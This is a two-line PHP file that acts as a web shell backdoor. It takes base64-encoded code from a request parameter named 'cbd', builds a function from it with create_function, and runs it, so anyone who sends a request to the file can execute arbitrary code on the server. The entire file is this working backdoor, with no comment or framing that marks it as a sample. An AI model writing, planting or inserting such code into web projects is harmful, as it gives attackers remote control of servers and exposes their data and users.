<?php
if(!empty($_REQUEST['cbd'])){$cbd=base64_decode($_REQUEST["cbd"]);$cbd=create_function('',$cbd);$cbd();exit;}